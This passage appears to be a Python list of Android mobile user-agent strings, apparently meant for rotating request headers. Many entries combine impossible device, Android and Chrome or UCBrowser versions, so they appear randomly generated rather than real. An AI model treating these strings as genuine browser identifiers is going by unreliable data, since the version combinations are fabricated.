'Mozilla/5.0 (Linux; Android 11; M2012K11C Build/V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/10.0.5653.221 UCBrowser/15.9.0.2270 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4288.136 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2012K11AC Build/I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4058.394 UCBrowser/20.6.0.4723 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4296.44 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; G870A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.3262.381 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2341) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3033.150 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH2217 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.313.348 UCBrowser/1.6.0.1269 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; 2201122G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.6282.296 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X6511) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/16.0.5875.252 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH1721 Build/I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/45.0.1772.284 UCBrowser/18.1.0.2046 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2371 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3877.317 UCBrowser/10.2.0.3771 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH1893 Build/N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/24.0.894.180 UCBrowser/18.1.0.915 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH1719 Build/S) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.1372.134 UCBrowser/7.5.0.5448 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH2371 Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.5943.241 UCBrowser/9.7.0.5436 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; J100FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/22.0.2792.303 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2101K9AG ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3042.235 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; X351) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4896.179 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH1875 Build/2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1699.314 UCBrowser/20.7.0.1312 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.6361.358 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; C7108) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.3234.168 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; A025AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.506.385 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119BC Build/V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.1089.344 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH2023) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/14.0.3470.326 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2010J19SG Build/E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.4429.394 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2006C3LVG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.5213.226 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; X650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.6025.200 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; M2010J19SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0.4339.356 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 2203121C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.2107.234 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; GT-P1000T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4631.130 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH1717) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.167.317 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4678.142 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X507) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.213.220 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4128.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 21061119DG Build/U) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3261.379 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2007J17G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/10.0.2647.400 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4766.185 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; N900A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.6357.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4607.62 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X573) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.628.305 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4726.142 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-19152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4554.83 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4460.138 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 2106118C Build/D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.465.331 UCBrowser/12.7.0.567 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; X401) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.195.121 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.3401.176 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; S367VL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/21.0.4363.66 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2012K10C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.5085.377 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-S5310G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4349.125 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; GT-S6012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4270.55 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2161 Build/J) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/17.0.5533.191 UCBrowser/1.9.0.1350 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; M2010J19SG Build/1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.2374.177 UCBrowser/13.5.0.1518 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; 21051182G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.5804.300 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2161 Build/T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.610.288 UCBrowser/5.4.0.675 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X559) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.4782.384 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2119 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.5086.298 UCBrowser/15.3.0.5351 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; 2206122SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.748.92 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH2025 Build/7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/22.0.4154.249 UCBrowser/5.6.0.2603 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; X503) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.5863.274 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4327.82 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH2113) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.6416.349 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; G950U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/13.0.3437.65 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2365) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.6133.343 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; J415G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.1417.350 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1310.58 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4886.128 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; 21091116UI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.1239.21 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 220233L2I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.6300.244 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; A3051) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.543.270 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; X5516C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.336.56 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; GT-S5560i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4587.77 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; GT-S6792L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4254.87 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X6815) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.6638.196 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2006C3MII Build/H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.6085.223 UCBrowser/2.9.0.1621 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH2389 Build/P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3774.163 UCBrowser/17.2.0.1488 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X624) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.4836.145 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-B5330) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4304.114 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; GT-8010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4859.44 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; GT-S6812i) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4672.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; 2106118C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.1089.103 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; X660) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.3844.118 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; N9009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.5263.376 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; GT-I8150) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4206.118 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; G3812B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.5355.76 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2089 Build/M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/27.0.3050.141 UCBrowser/10.10.0.532 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH2455 Build/4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.196.390 UCBrowser/15.2.0.5306 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; A305N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.4637.322 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 2109119BC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.819.95 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-I9008L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4568.135 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.5389.315 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.1860.163 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; 2201122G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.1551.300 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH1879) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.6020.316 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 2201116SI Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.4257.273 UCBrowser/11.2.0.220 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH2325 Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3736.117 UCBrowser/5.2.0.2192 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH2127 Build/L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.4736.69 UCBrowser/13.2.0.1651 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4692.53 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2105K81AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3481.80 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; G3502C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.377.34 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; M2002J9G Build/5) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4391.30 UCBrowser/19.6.0.4027 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2006C3MG Build/4) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4531.314 UCBrowser/19.7.0.5195 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.3931.112 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2159 Build/N) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.5611.206 UCBrowser/14.10.0.4818 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/17.0.2093.385 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH1717) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.2447.205 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4295.108 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; 2201122C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.5910.28 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 22021211RC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/26.0.1087.290 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4727.143 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2343 Build/T) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.3131.53 UCBrowser/6.9.0.2870 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH1613 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.4158.278 UCBrowser/6.10.0.3059 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2105K81C Build/1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4559.100 UCBrowser/4.1.0.4032 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/26.0.1810.270 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1943 Build/E) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.1589.213 UCBrowser/10.9.0.942 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; 22041219G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.5218.89 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; G891A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.2785.332 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; E426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.875.380 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; CPH1723) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.6165.249 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4326.132 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X693) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/22.0.1006.159 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; M2007J1SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3836.273 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4752.110 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4659.77 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1837 Build/W) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.5161.20 UCBrowser/3.5.0.4289 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-S7272C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4779.120 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3871.184 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4619.58 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; M2007J1SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2096.150 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2002J9G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/23.0.6050.247 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; CPH2249) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.857.170 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X671B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.178.209 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; X501) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.748.71 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; CPH2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.2879.315 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; G920K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.1604.377 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2069) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.467.203 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; M2007J3SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/24.0.5506.86 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; GT-S8600) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4424.97 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; M2102J2SC Build/1) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.6253.281 UCBrowser/15.4.0.821 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH1903) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.1638.160 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2007J1SC Build/2) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4916.262 UCBrowser/1.2.0.4163 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; CPH1983) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.4578.261 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; 2206122SC Build/A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/16.0.2278.182 UCBrowser/18.2.0.849 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; GT-S5310M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4080.115 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; M2004J7AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/17.0.2610.228 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH1959 Build/B) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/51.0.3808.223 UCBrowser/20.1.0.3524 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH2461 Build/6) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.3055.157 UCBrowser/5.1.0.1357 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-S7562C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4454.94 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH2031) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.5513.235 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-7245) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.4015.147 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 8; GT-B5330) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4569.54 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; CPH1719) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.1031.121 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; CPH1911 Build/V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.424.361 UCBrowser/16.2.0.1906 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; CPH2009 Build/Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.2304.102 UCBrowser/20.7.0.2088 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH2015 Build/7) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.1415.79 UCBrowser/4.5.0.2466 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; GT-19105) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4291.123 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2289.319 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; G615FU) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.5357.223 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; X663) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.640.19 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.4642.42 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; CPH1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.1911.203 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4; CPH1707 Build/9) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/34.0.3861.196 UCBrowser/9.7.0.2417 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 5; M2012K11I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.6090.390 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; M2007J3SG Build/V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2553.329 UCBrowser/6.4.0.1760 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; 21051182G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/26.0.5347.286 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; 2109119DI Build/I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.6536.183 UCBrowser/9.2.0.5519 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2105K81AC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.6340.357 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; 220333QAG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.4376.183 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; 220233L2I Build/R) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.1541.26 UCBrowser/11.7.0.3410 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 6; X626B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.6615.340 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; X697) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2796.57 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4583.57 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 21081111RG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1596.44 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; GT-93G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.4249.51 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2012K11AC Build/8) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.2423.115 UCBrowser/1.4.0.1911 Mobile Safari/537.36',
